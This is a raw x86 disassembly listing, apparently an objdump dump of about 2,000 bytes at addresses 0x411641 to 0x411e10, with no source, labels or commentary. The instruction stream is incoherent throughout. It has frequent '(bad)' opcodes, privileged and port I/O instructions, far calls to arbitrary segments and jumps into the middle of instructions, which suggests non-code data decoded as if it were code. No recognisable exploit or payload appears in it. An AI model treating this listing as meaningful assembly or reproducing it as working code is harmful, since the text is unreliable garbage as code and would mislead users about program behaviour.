  411641:	pop    ebp
  411642:	ss mov bh,0xa7
  411645:	pop    ebp
  411646:	enter  0x4b9,0xba
  41164a:	ins    DWORD PTR es:[edi],dx
  41164b:	jmp    0x6f05:0x6a89af1
  411652:	jecxz  0x411685
  411654:	push   edx
  411655:	and    DWORD PTR [edi],esp
  411657:	mov    dh,0x7e
  411659:	je     0x411677
  41165b:	jo     0x4115f3
  41165d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41165e:	leave  
  41165f:	popa   
  411660:	jl     0x411671
  411662:	add    al,0xd8
  411664:	jno    0x411688
  411666:	aad    0x7e
  411668:	mov    al,0xe7
  41166a:	cmc    
  41166b:	xor    al,BYTE PTR [esi]
  41166d:	adc    ah,BYTE PTR [ecx+0x789d2c5a]
  411673:	int    0xf3
  411675:	call   0xf77e:0xd72a4d38
  41167c:	cli    
  41167d:	xor    edi,esp
  41167f:	xchg   esi,eax
  411680:	cld    
  411681:	lods   eax,DWORD PTR ds:[esi]
  411682:	int3   
  411683:	lods   eax,DWORD PTR ds:[esi]
  411684:	xor    DWORD PTR [ebx],0xd
  411687:	dec    eax
  411688:	pop    ss
  411689:	sbb    esp,ebp
  41168b:	xlat   BYTE PTR ds:[ebx]
  41168c:	mov    dh,BYTE PTR [ebx]
  41168e:	ins    DWORD PTR es:[edi],dx
  41168f:	mov    al,0x9f
  411691:	or     BYTE PTR [ebp+0x4c],bl
  411694:	xchg   BYTE PTR [ebx-0x71],al
  411697:	(bad)  
  411698:	cmp    bh,ah
  41169a:	aas    
  41169b:	inc    ecx
  41169c:	dec    esi
  41169d:	jg     0x4116d9
  41169f:	xor    al,0xbe
  4116a1:	mov    esp,0x7fa190f5
  4116a6:	mov    ebp,0xb035d2c
  4116ab:	mov    bh,0xc6
  4116ad:	add    cl,bh
  4116af:	scas   eax,DWORD PTR es:[edi]
  4116b0:	xchg   si,ax
  4116b2:	sub    DWORD PTR [eax-0x4f69e525],ebx
  4116b8:	popf   
  4116b9:	lahf   
  4116ba:	dec    edx
  4116bb:	mov    edx,gs
  4116bd:	dec    edi
  4116be:	adc    al,0x96
  4116c0:	xchg   edx,eax
  4116c1:	sub    cl,BYTE PTR [eax]
  4116c3:	leave  
  4116c4:	adc    DWORD PTR [eax+0x2e83b006],esi
  4116ca:	iret   
  4116cb:	sub    bh,dl
  4116cd:	lahf   
  4116ce:	imul   esp,DWORD PTR [ecx],0x5a9509ef
  4116d4:	cmp    DWORD PTR [esi+0x62],ecx
  4116d7:	sub    ah,BYTE PTR [ebx]
  4116d9:	cli    
  4116da:	xchg   ebx,eax
  4116db:	mov    al,ds:0x80b2c8cf
  4116e0:	or     al,0x68
  4116e2:	inc    ebp
  4116e3:	xchg   BYTE PTR [ecx+0x139d5831],al
  4116e9:	call   0x77a7:0x4074d6a3
  4116f0:	adc    ebp,DWORD PTR [edx]
  4116f2:	loopne 0x4116fb
  4116f4:	test   BYTE PTR [ecx+0x5322374c],dl
  4116fa:	fsub   st(7),st
  4116fc:	sbb    DWORD PTR [ebx-0x56],eax
  4116ff:	sub    BYTE PTR [edx-0x45],ah
  411702:	mov    edi,0x52bcd6ac
  411707:	sbb    eax,0x432758cc
  41170c:	retf   
  41170d:	int    0x7
  41170f:	jge    0x4116ed
  411711:	pop    edi
  411712:	cs push esp
  411714:	loope  0x411736
  411716:	mov    dl,0xe0
  411718:	cmp    al,0xdb
  41171a:	imul   edx,DWORD PTR [ecx-0x128e477e],0x2d
  411721:	sar    esp,cl
  411723:	loopne 0x411744
  411725:	or     cl,BYTE PTR [ebp-0x46]
  411728:	cdq    
  411729:	adc    bl,ch
  41172b:	(bad)  
  41172c:	sub    ch,BYTE PTR ds:0x2aa508ae
  411732:	and    BYTE PTR [ebp-0x16],al
  411735:	popa   
  411736:	sub    ebp,ecx
  411738:	fwait
  411739:	push   esp
  41173a:	popa   
  41173b:	test   eax,0x54d1cac5
  411740:	aad    0x5
  411742:	mov    cl,0x55
  411744:	or     esi,DWORD PTR [eax-0x2928d84c]
  41174a:	ret    0x1caa
  41174d:	push   eax
  41174e:	fucomi st,st(7)
  411750:	test   DWORD PTR [edi+0x2a],edi
  411753:	out    0xb0,eax
  411755:	in     eax,dx
  411756:	idiv   ecx
  411758:	mov    BYTE PTR [ecx-0x75411901],ch
  41175e:	repz and dl,BYTE PTR [edx+0x241a05fd]
  411765:	int    0x89
  411767:	jbe    0x41179a
  411769:	cmp    BYTE PTR [ecx],ch
  41176b:	or     al,0x98
  41176d:	add    DWORD PTR [ebp+0x79],ecx
  411770:	ins    DWORD PTR es:[edi],dx
  411771:	hlt    
  411772:	sar    BYTE PTR [edi],cl
  411774:	mov    ds:0xef85e00a,eax
  411779:	or     BYTE PTR [eax-0x670bfda0],dl
  41177f:	int    0xca
  411781:	cwde   
  411782:	pushf  
  411783:	push   esi
  411784:	cld    
  411785:	inc    ebx
  411786:	sbb    DWORD PTR [esi-0x59],esi
  411789:	(bad)  
  41178a:	(bad)  
  41178c:	loope  0x41178d
  41178e:	or     bh,dl
  411790:	scas   al,BYTE PTR es:[edi]
  411791:	dec    ebp
  411792:	into   
  411793:	cwde   
  411794:	push   0x56
  411796:	scas   al,BYTE PTR es:[edi]
  411797:	mov    ?,WORD PTR [edx-0x6f]
  41179a:	mov    eax,0x1f31cea3
  41179f:	xchg   cl,bh
  4117a1:	dec    edx
  4117a2:	out    dx,al
  4117a3:	jle    0x41173a
  4117a5:	mov    dh,0xa6
  4117a7:	sub    eax,0x564c2b0d
  4117ac:	repnz in eax,dx
  4117ae:	fsub   DWORD PTR ds:0x43d334d9
  4117b4:	xor    ah,ah
  4117b6:	or     BYTE PTR [esi-0x4a7a3e53],ch
  4117bc:	fsubp  st(3),st
  4117be:	and    DWORD PTR [edx+0x4c],ebx
  4117c1:	test   eax,0xa0ebb871
  4117c6:	sub    al,0x67
  4117c8:	sahf   
  4117c9:	push   0x7b
  4117cb:	(bad)  
  4117cd:	clc    
  4117ce:	mov    bl,al
  4117d0:	mov    dh,0xfa
  4117d2:	clc    
  4117d3:	sar    BYTE PTR [eax+edx*4],1
  4117d6:	cwde   
  4117d7:	scas   al,BYTE PTR es:[edi]
  4117d8:	pop    esp
  4117d9:	mov    dl,0x4
  4117db:	mov    ecx,0xdeb5c7d1
  4117e0:	dec    ebx
  4117e1:	es pop es
  4117e3:	mov    bh,0x4c
  4117e5:	inc    ecx
  4117e6:	imul   esi,DWORD PTR [edx-0x33],0x4c
  4117ea:	int    0x60
  4117ec:	int3   
  4117ed:	repz or eax,DWORD PTR [eax-0x74]
  4117f1:	sbb    eax,0xd445a8ca
  4117f6:	mov    eax,ds:0xa5416153
  4117fb:	in     al,dx
  4117fc:	rcl    ebx,cl
  4117fe:	jle    0x411868
  411800:	test   DWORD PTR [eax-0x21],ecx
  411803:	pusha  
  411804:	(bad)  
  411805:	hlt    
  411806:	push   0x2abb0aaa
  41180b:	pop    es
  41180c:	aam    0xea
  41180e:	xor    al,BYTE PTR [ebx+0x668ebe2a]
  411814:	mov    ds:0xbf3ac75a,eax
  411819:	bswap  ecx
  41181b:	gs mov cl,0x61
  41181e:	popfw  
  411820:	pop    es
  411821:	or     ebx,DWORD PTR [edx]
  411823:	clc    
  411824:	lock fwait
  411826:	test   eax,0x21092a90
  41182b:	xor    dh,BYTE PTR [edx+edi*8]
  41182e:	out    dx,eax
  41182f:	or     BYTE PTR ds:0x3674ed6b,dh
  411835:	mov    ah,0x99
  411837:	inc    edi
  411838:	shl    ecx,1
  41183a:	and    eax,0x2997ab0b
  41183f:	jmp    0x411839
  411841:	cs das 
  411843:	jmp    0x86d72822
  411848:	in     al,0x8
  41184a:	dec    ebx
  41184b:	xchg   ebp,eax
  41184c:	push   esp
  41184d:	cwde   
  41184e:	sub    DWORD PTR [eax],ecx
  411850:	cmp    BYTE PTR [ecx-0x7c352039],0x99
  411857:	sbb    al,0xd9
  411859:	inc    ecx
  41185a:	ss out dx,al
  41185c:	stos   BYTE PTR es:[edi],al
  41185d:	cmp    dh,BYTE PTR [ebx]
  41185f:	mov    bl,0xe9
  411861:	jnp    0x4117e8
  411863:	mov    esp,0x530b56e2
  411868:	rol    DWORD PTR [edx+0x3afcf634],0x4
  41186f:	and    edi,ecx
  411871:	lock pop edi
  411873:	data16 stc 
  411875:	mov    ?,WORD PTR [ebx]
  411877:	pusha  
  411878:	icebp  
  411879:	jle    0x411842
  41187b:	add    ah,dh
  41187d:	call   0x56c2:0x6057790
  411884:	inc    ebx
  411885:	ds jbe 0x41184b
  411888:	fwait
  411889:	cli    
  41188a:	inc    edi
  41188b:	(bad)  
  41188c:	adc    al,0x96
  41188e:	jl     0x41186b
  411890:	in     eax,dx
  411891:	xor    BYTE PTR ds:0x640d70ca,0x43
  411898:	push   eax
  411899:	retf   0x90a1
  41189c:	(bad)  
  41189e:	or     eax,0xb6bfa888
  4118a3:	mul    BYTE PTR [edx]
  4118a5:	ss xchg ecx,eax
  4118a7:	or     eax,0x9f9f9348
  4118ac:	add    ch,0xf0
  4118af:	rcr    DWORD PTR [eax+ecx*8-0x3afdc35e],0x7b
  4118b7:	stc    
  4118b8:	(bad)  
  4118b9:	int3   
  4118ba:	ret    0x1e4
  4118bd:	push   eax
  4118be:	jg     0x411866
  4118c0:	aad    0x27
  4118c2:	cmp    al,0x6
  4118c4:	loop   0x411855
  4118c6:	cdq    
  4118c7:	and    edx,DWORD PTR [ebp-0x33]
  4118ca:	xchg   esp,eax
  4118cb:	ror    DWORD PTR [edi+eax*2+0x22],0xb3
  4118d0:	mov    bh,0x81
  4118d2:	or     DWORD PTR [eax],edi
  4118d4:	rol    DWORD PTR [esi],cl
  4118d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118d7:	outs   dx,DWORD PTR ds:[esi]
  4118d8:	and    esi,DWORD PTR [edx-0x5c59505c]
  4118de:	dec    eax
  4118df:	inc    esi
  4118e0:	(bad)
  4118e5:	mov    ebx,0x403a99c9
  4118ea:	into   
  4118eb:	cmp    DWORD PTR [edx-0x64661243],esi
  4118f1:	test   BYTE PTR [eax-0x2d7cb5a3],ch
  4118f7:	xchg   ecx,eax
  4118f8:	iret   
  4118f9:	inc    ebp
  4118fa:	repz scas eax,DWORD PTR es:[edi]
  4118fc:	mov    al,ds:0xae01cf4
  411901:	mov    dl,0xed
  411903:	and    al,0x4
  411905:	sbb    BYTE PTR [esi+0x5ce5946f],0x79
  41190c:	or     ebx,DWORD PTR [ebp+0x6]
  41190f:	cli    
  411910:	adc    eax,0x636f0e0
  411915:	inc    edx
  411916:	lahf   
  411917:	push   ebp
  411918:	mov    bh,0xa1
  41191a:	pop    esp
  41191b:	pop    ebx
  41191c:	push   ebp
  41191d:	bound  eax,QWORD PTR [edx+0x4d6f1961]
  411923:	inc    ecx
  411924:	pop    ss
  411925:	retf   0x9031
  411928:	les    ecx,FWORD PTR [edi+0x6d636545]
  41192e:	out    dx,eax
  41192f:	cld    
  411930:	lods   al,BYTE PTR ds:[esi]
  411931:	mov    ah,0xf8
  411933:	aam    0xaf
  411935:	dec    esp
  411936:	push   cs
  411937:	xor    BYTE PTR [esp+0x4f],dh
  41193b:	lea    edi,[edx+eax*4]
  41193e:	daa    
  41193f:	inc    eax
  411940:	icebp  
  411941:	xchg   ebp,eax
  411942:	ja     0x4119bc
  411944:	pop    ecx
  411945:	adc    DWORD PTR [edi],esi
  411947:	xchg   ebx,eax
  411948:	jno    0x4119c5
  41194a:	jmp    0xa58c954a
  41194f:	outs   dx,BYTE PTR ds:[esi]
  411950:	or     BYTE PTR [ebp+0x6c],bh
  411953:	and    ch,BYTE PTR [ecx-0x2be57874]
  411959:	sbb    bl,BYTE PTR [edx+eax*8-0x78]
  41195d:	adc    BYTE PTR [eax-0x37d385b7],0x50
  411964:	pushf  
  411965:	cmp    eax,0x60cfe8e9
  41196a:	ficom  DWORD PTR [esi+0x270ef52c]
  411970:	jl     0x4119a5
  411972:	int    0xf2
  411974:	loopne 0x411990
  411976:	and    edi,edx
  411978:	xor    BYTE PTR [esi],ah
  41197a:	inc    ecx
  41197b:	add    esp,DWORD PTR [edi-0x20]
  41197e:	mov    edx,0x691529d1
  411983:	mov    ch,BYTE PTR [eax]
  411985:	stos   DWORD PTR es:[edi],eax
  411986:	in     al,dx
  411987:	aad    0x1e
  411989:	push   0xffffffc0
  41198b:	sbb    eax,0xfb0484eb
  411990:	call   0x9cfd964b
  411995:	iret   
  411996:	sbb    ebx,esp
  411998:	pop    edx
  411999:	add    bh,BYTE PTR [esi+0x55]
  41199c:	mov    ds:0x7441862e,eax
  4119a1:	pop    esp
  4119a2:	xor    eax,0xe88774c8
  4119a7:	sub    BYTE PTR [edx+edx*8],cl
  4119aa:	rcl    BYTE PTR [ebx-0x1b2f9e42],0xe3
  4119b1:	fnstsw WORD PTR [ecx-0x5f299378]
  4119b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119b8:	shr    BYTE PTR [edx+0x43],cl
  4119bb:	sub    esi,esi
  4119bd:	sub    esi,DWORD PTR [edx-0x33196800]
  4119c3:	cmp    eax,0xac2c769e
  4119c8:	or     BYTE PTR [ecx+0x43d511a4],ah
  4119ce:	adc    ah,BYTE PTR [edx-0xd]
  4119d1:	or     BYTE PTR [esi-0x47],al
  4119d4:	hlt    
  4119d5:	dec    ecx
  4119d6:	cs int3 
  4119d8:	out    dx,al
  4119d9:	mov    esi,0x9f8d1805
  4119de:	out    dx,eax
  4119df:	push   esi
  4119e0:	mov    ebp,?
  4119e2:	std    
  4119e3:	dec    esp
  4119e4:	loope  0x411997
  4119e6:	sbb    cl,ch
  4119e8:	addr16 dec edx
  4119ea:	add    eax,DWORD PTR [edi-0x66]
  4119ed:	cld    
  4119ee:	inc    eax
  4119ef:	xor    al,0xba
  4119f1:	pop    es
  4119f2:	ins    DWORD PTR es:[edi],dx
  4119f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119f4:	test   al,0xb3
  4119f6:	dec    ebp
  4119f7:	fbld   TBYTE PTR [ebx]
  4119f9:	mov    al,0x78
  4119fb:	jp     0x411a65
  4119fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119fe:	fiadd  WORD PTR [ecx-0x14]
  411a01:	stc    
  411a02:	call   0x5951:0xb31b6145
  411a09:	test   al,0x98
  411a0b:	push   0xe9e9e118
  411a10:	pop    ecx
  411a11:	(bad)  
  411a12:	jb     0x411a42
  411a14:	add    BYTE PTR [ecx],dh
  411a16:	xlat   BYTE PTR ds:[ebx]
  411a17:	and    BYTE PTR [edi-0x42],cl
  411a1a:	je     0x411a5a
  411a1c:	fst    QWORD PTR [ebx-0x17f625ad]
  411a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a23:	lahf   
  411a24:	pop    edi
  411a25:	xchg   edi,eax
  411a26:	pushf  
  411a27:	mov    BYTE PTR [edi-0xc],dl
  411a2a:	pushf  
  411a2b:	icebp  
  411a2c:	lahf   
  411a2d:	pushf  
  411a2e:	pop    ds
  411a2f:	xchg   ebx,eax
  411a30:	mov    ebp,0x32b2920
  411a35:	pushf  
  411a36:	or     BYTE PTR [edi+0x14d19e6],al
  411a3c:	jmp    0x411a55
  411a3e:	dec    ebx
  411a3f:	hlt    
  411a40:	mov    bh,0xa9
  411a42:	repz (bad) 
  411a45:	pusha  
  411a46:	sbb    esi,DWORD PTR [edx+0x1e]
  411a49:	xor    eax,DWORD PTR [esi+0x5a6ea787]
  411a4f:	icebp  
  411a50:	stos   DWORD PTR es:[edi],eax
  411a51:	bound  edx,QWORD PTR [ebx]
  411a53:	(bad)  
  411a54:	retf   
  411a55:	call   0x8be3:0x6fd059d6
  411a5c:	jb     0x411a25
  411a5e:	std    
  411a5f:	xor    eax,esi
  411a61:	aaa    
  411a62:	lock jl 0x411ab6
  411a65:	scas   al,BYTE PTR es:[edi]
  411a66:	and    cl,dl
  411a68:	dec    ebx
  411a69:	retf   
  411a6a:	shl    BYTE PTR ds:0x25ea52d2,0x94
  411a71:	nop
  411a72:	adc    esp,DWORD PTR [ebx]
  411a74:	loopne 0x411a87
  411a76:	icebp  
  411a77:	ins    BYTE PTR es:[edi],dx
  411a78:	add    BYTE PTR [edx+0x47],bh
  411a7b:	cld    
  411a7c:	scas   al,BYTE PTR es:[edi]
  411a7d:	and    al,0xf0
  411a7f:	stc    
  411a80:	es enter 0x433b,0x8e
  411a85:	adc    al,0x72
  411a87:	nop
  411a88:	mov    bl,0xb8
  411a8a:	xchg   dl,bh
  411a8c:	jmp    0x411aa0
  411a8e:	(bad)
  411a92:	jmp    0xec573021
  411a97:	jge    0x411ae9
  411a99:	(bad)  
  411a9a:	in     al,dx
  411a9b:	aas    
  411a9c:	pop    ebp
  411a9d:	pop    edi
  411a9e:	jmp    0xdfa4:0x3756e8c7
  411aa5:	mov    al,0x5e
  411aa7:	mov    dl,0xa3
  411aa9:	shr    DWORD PTR [edi-0x1e],cl
  411aac:	and    al,0x75
  411aae:	or     al,0x32
  411ab0:	jle    0x411a5d
  411ab2:	add    DWORD PTR [esp+esi*4-0x8],esi
  411ab6:	and    eax,0xfb911262
  411abb:	adc    BYTE PTR [ebp+ebp*4+0x5ffcd92f],bl
  411ac2:	push   edx
  411ac3:	sub    al,dl
  411ac5:	mov    eax,ds:0xbedca744
  411aca:	mov    ah,0x9c
  411acc:	fadd   QWORD PTR [edi]
  411ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411acf:	mov    DWORD PTR [esi+esi*4],edi
  411ad2:	mov    dl,0x4f
  411ad4:	cmp    cl,BYTE PTR [edi]
  411ad6:	cwde   
  411ad7:	pushf  
  411ad8:	mov    bl,0x18
  411ada:	and    eax,0x3ee9b956
  411adf:	push   eax
  411ae0:	imul   edi,ebp,0xe8a9d129
  411ae6:	fldcw  WORD PTR [edx-0x77a216d6]
  411aec:	gs pop ds
  411aee:	into   
  411aef:	sbb    eax,0x28210916
  411af4:	sbb    BYTE PTR [ecx],bl
  411af6:	inc    eax
  411af7:	cli    
  411af8:	or     ebx,DWORD PTR [edx-0x14]
  411afb:	sbb    ebx,DWORD PTR [ecx+ebx*1]
  411afe:	xchg   ecx,eax
  411aff:	clc    
  411b00:	call   0x9bd6:0xcc5b1755
  411b07:	es repz push es
  411b0a:	fild   QWORD PTR [esi]
  411b0c:	mov    ecx,0x695bfa1d
  411b11:	js     0x411ab8
  411b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b14:	xchg   edi,eax
  411b15:	mov    dl,0xb
  411b17:	sbb    BYTE PTR [ebx-0x3b23ab45],0x2c
  411b1e:	fild   WORD PTR [ecx+0xf3a88a8]
  411b24:	adc    al,0xc9
  411b26:	mov    ds:0x9fb40981,eax
  411b2b:	jnp    0x411b85
  411b2d:	sbb    DWORD PTR [ebx+0x7],ebx
  411b30:	pop    ds
  411b31:	and    al,0x8c
  411b33:	sahf   
  411b34:	in     eax,0x94
  411b36:	adc    bl,0x43
  411b39:	sbb    esp,DWORD PTR [ebx-0x52]
  411b3c:	push   ebx
  411b3d:	out    dx,al
  411b3e:	inc    ecx
  411b3f:	or     eax,0x68849d24
  411b44:	mov    esp,?
  411b46:	xchg   ebp,eax
  411b47:	into   
  411b48:	(bad)  
  411b49:	data16 mov al,bl
  411b4c:	mov    edi,0xf4742988
  411b51:	bound  edx,QWORD PTR [eax-0x55030e9a]
  411b57:	pop    ds
  411b58:	ret    
  411b59:	(bad)  
  411b5a:	loopne 0x411bc1
  411b5c:	ret    0xbb28
  411b5f:	and    eax,0xb0cf3077
  411b64:	xchg   edi,eax
  411b65:	sbb    DWORD PTR ds:0xe7754df3,esi
  411b6b:	in     al,0xe9
  411b6d:	add    esp,DWORD PTR ds:0xceb8260a
  411b73:	jp     0x411afd
  411b75:	jg     0x411bed
  411b77:	in     al,dx
  411b78:	(bad)  [edx]
  411b7a:	rsm    
  411b7c:	sub    DWORD PTR [edi+0x3e914756],ebx
  411b82:	xchg   ebp,eax
  411b83:	add    eax,0x40ec3428
  411b88:	sub    cl,BYTE PTR [edx]
  411b8a:	sub    eax,0x35617432
  411b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b90:	cmp    dl,bl
  411b92:	xchg   esp,eax
  411b93:	fwait
  411b94:	xchg   ecx,eax
  411b95:	dec    ebx
  411b96:	xchg   DWORD PTR [edx+0x6254d581],edi
  411b9c:	sbb    ch,BYTE PTR [eax+0x97fcde8]
  411ba2:	inc    esp
  411ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba4:	test   al,0xf8
  411ba6:	or     BYTE PTR [ebp+edi*2-0x6a],bl
  411baa:	dec    BYTE PTR [eax-0x5e9ebdaf]
  411bb0:	sub    dl,BYTE PTR [eax]
  411bb2:	rcr    dh,cl
  411bb4:	adc    BYTE PTR [esi],0xf5
  411bb7:	lock loope 0x411c31
  411bba:	repz rcr BYTE PTR [eax+0x3154cec5],cl
  411bc1:	ja     0x411be1
  411bc3:	(bad)  
  411bc5:	fwait
  411bc6:	jp     0x411ba4
  411bc8:	add    BYTE PTR [edx+esi*8+0x55a84960],ah
  411bcf:	jecxz  0x411bd2
  411bd1:	sub    edi,0x34
  411bd4:	jmp    0x9b74:0xed5066dc
  411bdb:	cmp    DWORD PTR [esi+0x5b5c05b0],ebx
  411be1:	sbb    eax,DWORD PTR [ecx+0x2b]
  411be4:	rcr    ebx,1
  411be6:	aas    
  411be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411be8:	pop    esi
  411be9:	loope  0x411c59
  411beb:	fwait
  411bec:	cdq    
  411bed:	or     eax,0xbcda8b0c
  411bf2:	out    0x5f,al
  411bf4:	add    al,0xf9
  411bf6:	outs   dx,BYTE PTR ds:[esi]
  411bf7:	aas    
  411bf8:	je     0x411bff
  411bfa:	xor    eax,0xf5048c5e
  411bff:	or     ebx,edi
  411c01:	or     eax,0x96e5739e
  411c06:	add    DWORD PTR [ecx+0x60e88a54],edi
  411c0c:	ror    DWORD PTR [ebx+0x9],0xc8
  411c10:	cmp    DWORD PTR [esi-0x1c3c1a5d],esi
  411c16:	ficom  DWORD PTR es:[eax+0x6749ee56]
  411c1d:	(bad)  
  411c1e:	mov    esi,0x45a83ff1
  411c23:	add    al,0xe5
  411c25:	sub    bh,ch
  411c27:	xlat   BYTE PTR ds:[ebx]
  411c28:	push   0xea615469
  411c2d:	nop
  411c2e:	retf   
  411c2f:	ins    DWORD PTR es:[edi],dx
  411c30:	call   0x67bf:0xe56271e7
  411c37:	mov    DWORD PTR [edi-0x11],ecx
  411c3a:	icebp  
  411c3b:	and    BYTE PTR [edx],bh
  411c3d:	xlat   BYTE PTR ds:[ebx]
  411c3e:	mov    esi,0xccb6c88b
  411c43:	xchg   BYTE PTR [ebp+0x69],dl
  411c46:	and    al,ch
  411c48:	or     eax,0x3b76bb8a
  411c4d:	inc    ebx
  411c4e:	dec    edi
  411c4f:	call   0xb94cb756
  411c54:	fnstsw WORD PTR [ebx+ebx*8+0x729ffea4]
  411c5b:	fadd   DWORD PTR [esi+0x62a3c149]
  411c61:	std    
  411c62:	push   esi
  411c63:	add    al,0x69
  411c65:	ins    BYTE PTR es:[edi],dx
  411c66:	fdivr  QWORD PTR [eax+0x4d]
  411c69:	out    0x86,eax
  411c6b:	sub    cl,bl
  411c6d:	add    DWORD PTR [edx],0x3051480
  411c73:	dec    esp
  411c74:	mov    BYTE PTR [edi*1+0x79bc9b9b],dh
  411c7b:	mov    al,0x12
  411c7d:	push   ds
  411c7e:	add    ch,BYTE PTR ds:0xd7a87959
  411c84:	adc    eax,eax
  411c86:	sub    al,0x53
  411c88:	inc    esp
  411c89:	fist   WORD PTR [esi+0x7b]
  411c8c:	int3   
  411c8d:	adc    al,BYTE PTR [edi]
  411c8f:	lahf   
  411c90:	mov    ch,0x93
  411c92:	loop   0x411c2f
  411c94:	mov    DWORD PTR [edi],esi
  411c96:	dec    esp
  411c97:	adc    al,0x3f
  411c99:	add    DWORD PTR [edi+0x31ce4568],0x9
  411ca0:	inc    esi
  411ca1:	retf   0xd5e1
  411ca4:	jo     0x411cea
  411ca6:	pop    edi
  411ca7:	and    BYTE PTR [esi-0x237e7152],dh
  411cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cae:	add    eax,ecx
  411cb0:	mov    ah,BYTE PTR [ecx]
  411cb2:	cmp    dl,BYTE PTR [ebp-0x4c]
  411cb5:	vrangesd xmm3{k3}{z},xmm0,xmm4,{sae},0xf7
  411cbc:	mov    dl,0x45
  411cbe:	jmp    0x30d2:0x72c60995
  411cc5:	popa   
  411cc6:	pop    esp
  411cc7:	test   BYTE PTR [edx+eiz*8+0x6b],0x17
  411ccc:	lods   al,BYTE PTR ds:[esi]
  411ccd:	sbb    al,BYTE PTR [edx-0x5935f0ea]
  411cd3:	xchg   esi,eax
  411cd4:	stos   DWORD PTR es:[edi],eax
  411cd5:	cmc    
  411cd6:	xchg   ecx,eax
  411cd7:	sub    al,0x93
  411cd9:	pusha  
  411cda:	mov    BYTE PTR [edi+0x6b6d3957],al
  411ce0:	je     0x411d25
  411ce2:	loopne 0x411d0c
  411ce4:	mov    eax,ds:0x71b6e66f
  411ce9:	(bad)  
  411cea:	cmc    
  411ceb:	xchg   ebx,eax
  411cec:	and    ecx,esi
  411cee:	ss push eax
  411cf0:	je     0x411d62
  411cf2:	mov    WORD PTR [esi+ecx*8],es
  411cf5:	or     DWORD PTR [eax-0x6910a352],eax
  411cfb:	stos   BYTE PTR es:[edi],al
  411cfc:	ds cwde 
  411cfe:	mov    esi,0xe16f3422
  411d03:	pushf  
  411d04:	aaa    
  411d05:	adc    BYTE PTR [ecx+edi*4-0x1c],cl
  411d09:	xchg   edi,eax
  411d0a:	xchg   ebx,eax
  411d0b:	hlt    
  411d0c:	dec    edx
  411d0d:	jg     0x411c9e
  411d0f:	dec    eax
  411d10:	and    edi,DWORD PTR [esi]
  411d12:	sti    
  411d13:	ds inc esi
  411d15:	lahf   
  411d16:	mov    edi,0x733f9315
  411d1b:	pop    edx
  411d1c:	(bad)  
  411d1d:	pushf  
  411d1e:	loope  0x411d6d
  411d20:	jno    0x411ca9
  411d22:	pop    ss
  411d23:	mov    ecx,0x4cad2313
  411d28:	(bad)  
  411d29:	daa    
  411d2a:	xor    eax,0x58de9b41
  411d2f:	mov    eax,0x77a019f6
  411d34:	aam    0xf0
  411d36:	xlat   BYTE PTR ds:[ebx]
  411d37:	(bad)  
  411d38:	scas   al,BYTE PTR es:[edi]
  411d39:	add    ch,BYTE PTR [eax]
  411d3b:	imul   ebx,DWORD PTR [edx-0x7a],0xd8b105f3
  411d42:	add    eax,0x38525f3c
  411d47:	rcr    BYTE PTR [edx-0x3e6be85e],1
  411d4d:	cmp    bh,BYTE PTR [edi]
  411d4f:	sub    BYTE PTR [edx],cl
  411d51:	dec    ebx
  411d52:	inc    edx
  411d53:	jne    0x411d32
  411d55:	jb     0x411ce0
  411d57:	data16 sbb al,0x1a
  411d5a:	mov    al,ds:0xe131743c
  411d5f:	jmp    0x411db3
  411d61:	(bad)  
  411d62:	bound  eax,QWORD PTR [eax+ebx*4+0x52]
  411d66:	aas    
  411d67:	sub    edi,DWORD PTR [eax-0x4b6277dc]
  411d6d:	add    DWORD PTR [edi+ebx*2-0x546cabc9],esi
  411d74:	retf   
  411d75:	inc    esi
  411d76:	test   al,0x9b
  411d78:	sahf   
  411d79:	xchg   ecx,eax
  411d7a:	cld    
  411d7b:	cmp    ebp,DWORD PTR [ebx-0x4e]
  411d7e:	ins    DWORD PTR es:[edi],dx
  411d7f:	xchg   ebp,eax
  411d80:	(bad)  [esi]
  411d82:	mov    ds:0x719d5437,al
  411d87:	jnp    0x411dc0
  411d89:	sbb    bh,BYTE PTR [esi-0x4]
  411d8c:	lods   al,BYTE PTR ds:[esi]
  411d8d:	gs mov ebx,0xa165f55f
  411d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d94:	cmp    cl,BYTE PTR [ebp-0x17289aa3]
  411d9a:	ss inc ecx
  411d9c:	jo     0x411e1d
  411d9e:	mov    gs,WORD PTR [ebp+eiz*2+0x6f9cbfb2]
  411da5:	fld    TBYTE PTR [edx+0x6f]
  411da8:	add    al,0xf0
  411daa:	mov    ds:0x188eae82,eax
  411daf:	sahf   
  411db0:	and    ch,BYTE PTR [ebx]
  411db2:	imul   ecx,DWORD PTR [ecx+ebp*1],0xa10ba729
  411db9:	int    0x15
  411dbb:	xor    al,0x77
  411dbd:	or     al,0x45
  411dbf:	mov    ds:0x5a066f46,al
  411dc4:	outs   dx,BYTE PTR ds:[esi]
  411dc5:	dec    esi
  411dc6:	js     0x411d8c
  411dc8:	or     DWORD PTR [edi-0x493e77c5],0x3104a9e0
  411dd2:	enter  0x4f53,0x89
  411dd6:	test   DWORD PTR [edi+ebx*1+0x5e81a119],0x9369ca2
  411de1:	sar    BYTE PTR [ecx],1
  411de3:	push   esi
  411de4:	push   ebp
  411de5:	cli    
  411de6:	push   0x35
  411de8:	je     0x411d72
  411dea:	adc    al,0x6f
  411dec:	xchg   esi,eax
  411ded:	mov    esp,0x6030f1fd
  411df2:	fs push esi
  411df4:	je     0x411dbd
  411df6:	add    al,0xc4
  411df9:	dec    edi
  411dfa:	inc    eax
  411dfb:	daa    
  411dfc:	fwait
  411dfd:	js     0x411dd9
  411dff:	xor    eax,0xe8cf5db2
  411e04:	dec    eax
  411e05:	pop    ss
  411e06:	sub    eax,0x2aedd0a0
  411e0b:	in     al,0xc3
  411e0d:	sub    al,0xc5
  411e0f:	inc    ebp
  411e10:	and    bh,BYTE PTR [ebx-0x2bd48832]
